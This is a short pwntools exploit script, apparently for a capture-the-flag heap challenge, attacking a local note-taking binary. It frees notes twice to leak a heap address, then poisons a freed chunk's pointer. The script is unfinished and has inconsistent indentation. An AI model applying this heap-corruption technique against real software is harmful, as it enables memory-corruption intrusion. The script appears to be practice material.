from pwn import *

s = process("./test")

def add_note(pay):
	s.recvuntil("Your choice:")
	s.sendline("2")
	s.recvuntil("Length of new note:")
	s.sendline(str(len(pay)))
	s.recvuntil("Enter your note:")
	s.send(pay)

def delete_note(idx):
	s.recvuntil("Your choice:")
        s.sendline("4")
	s.recvuntil("Note number:")
	s.sendline(str(idx))

def list_note():
	s.recvuntil("Your choice:")
        s.sendline("1")

def edit_note(idx,pay):
	s.recvuntil("Your choice:")
        s.sendline("3")
	s.recvuntil("Note number:")
	s.sendline(str(idx))
	s.recvuntil("Length of note:")
	s.sendline(str(len(pay)))
	s.recvuntil("Enter your note:")
	s.send(pay)

add_note('A'*0x30)#0
add_note('B'*0x30)#1
add_note('C'*0x30)#2
add_note('D'*0x30)#3
add_note('E'*0x41)#3
raw_input("step1 success")
delete_note(0)
delete_note(1)
add_note('E'*0x30)#0
raw_input("step2 success")
delete_note(2)
delete_note(1)
list_note()
raw_input("step3 success")
s.recvuntil('0. ')
heap = u64(s.recv(4)+'\x00'*4) - 0x18a0
print 'heap:',hex(heap)

edit_note(0,p64(heap+0x80)+'F'*0x28)
add_note('G'*0x30)
add_note('H'*0x30)
raw_input("step4 success")
#add_note('E'*0x10)
s.interactive()
